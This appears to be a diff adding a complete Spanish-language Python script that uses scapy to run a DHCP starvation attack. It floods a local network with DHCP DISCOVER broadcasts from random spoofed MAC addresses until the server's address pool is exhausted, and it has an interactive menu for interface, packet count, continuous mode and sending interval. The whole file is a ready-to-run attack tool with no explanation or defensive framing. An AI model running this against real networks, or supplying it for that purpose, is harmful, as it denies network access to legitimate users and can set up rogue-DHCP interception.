@@ -1,0 +1,143 @@
+#!/usr/bin/env python3
+
+from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, get_if_list
+import random
+import time
+import sys
+import os
+
+
+def verificar_root():
+    if os.geteuid() != 0:
+        print("[!] Requiere root. Usa: sudo python3 dhcp_starvation.py")
+        sys.exit(1)
+
+
+def mac_aleatoria():
+    octetos = [random.randint(0, 255) for _ in range(6)]
+    return ":".join(f"{o:02x}" for o in octetos)
+
+
+def crear_discover(mac_origen):
+    mac_bytes = bytes(int(x, 16) for x in mac_origen.split(":"))
+    paquete = (
+        Ether(src=mac_origen, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
+        UDP(sport=68, dport=67) /
+        BOOTP(
+            chaddr=mac_bytes,
+            xid=random.randint(1, 0xFFFFFFFF),
+            flags=0x8000
+        ) /
+        DHCP(options=[("message-type", "discover"), "end"])
+    )
+    return paquete
+
+
+def ejecutar_starvation(interfaz, cantidad, intervalo, continuo):
+    print()
+    print(f"[*] Interfaz : {interfaz}")
+    if continuo:
+        print(f"[*] Modo     : CONTINUO (hasta Ctrl+C)")
+    else:
+        print(f"[*] Cantidad : {cantidad} solicitudes")
+    print(f"[*] Intervalo: {intervalo}s entre paquetes")
+    print()
+
+    enviados = 0
+
+    try:
+        while True:
+            mac = mac_aleatoria()
+            pkt = crear_discover(mac)
+            sendp(pkt, iface=interfaz, verbose=False)
+            enviados += 1
+
+            if continuo:
+                print(f"[{enviados}] DISCOVER enviado | MAC: {mac}")
+            else:
+                print(f"[{enviados}/{cantidad}] DISCOVER enviado | MAC: {mac}")
+
+            if intervalo > 0:
+                time.sleep(intervalo)
+
+            if not continuo and enviados >= cantidad:
+                break
+
+    except KeyboardInterrupt:
+        print(f"\n[*] Ataque interrumpido. Total enviados: {enviados}")
+        return
+
+    print(f"\n[+] Ataque completado. Total enviados: {enviados}")
+
+
+def menu():
+    print("=" * 55)
+    print("       ATAQUE DHCP STARVATION")
+    print("=" * 55)
+
+    interfaces = get_if_list()
+    print("\n[*] Interfaces disponibles:")
+    for i, iface in enumerate(interfaces, 1):
+        print(f"    {i}. {iface}")
+
+    while True:
+        try:
+            opcion = int(input("\n[?] Selecciona la interfaz (numero): "))
+            if 1 <= opcion <= len(interfaces):
+                interfaz = interfaces[opcion - 1]
+                break
+            print("[!] Numero fuera de rango.")
+        except ValueError:
+            print("[!] Ingresa un numero valido.")
+
+    print()
+    print("[*] Modos disponibles:")
+    print("    1. Cantidad especifica de solicitudes")
+    print("    2. Continuo (hasta Ctrl+C)")
+
+    while True:
+        modo = input("\n[?] Selecciona el modo (1 o 2): ").strip()
+        if modo in ("1", "2"):
+            continuo = (modo == "2")
+            break
+        print("[!] Opcion invalida.")
+
+    cantidad = 0
+    if not continuo:
+        while True:
+            try:
+                cantidad = int(input("[?] Cantidad de DISCOVER a enviar: "))
+                if cantidad > 0:
+                    break
+                print("[!] Debe ser mayor a 0.")
+            except ValueError:
+                print("[!] Ingresa un numero valido.")
+
+    while True:
+        try:
+            intervalo = float(input("[?] Intervalo entre paquetes en segundos (0.01 recomendado): "))
+            if intervalo >= 0:
+                break
+            print("[!] Debe ser mayor o igual a 0.")
+        except ValueError:
+            print("[!] Ingresa un numero valido.")
+
+    return interfaz, cantidad, intervalo, continuo
+
+
+def main():
+    verificar_root()
+    interfaz, cantidad, intervalo, continuo = menu()
+
+    print()
+    confirmar = input("[?] Iniciar ataque? (s/n): ").strip().lower()
+    if confirmar != "s":
+        print("[*] Cancelado.")
+        sys.exit(0)
+
+    ejecutar_starvation(interfaz, cantidad, intervalo, continuo)
+
+
+if __name__ == "__main__":
+    main()
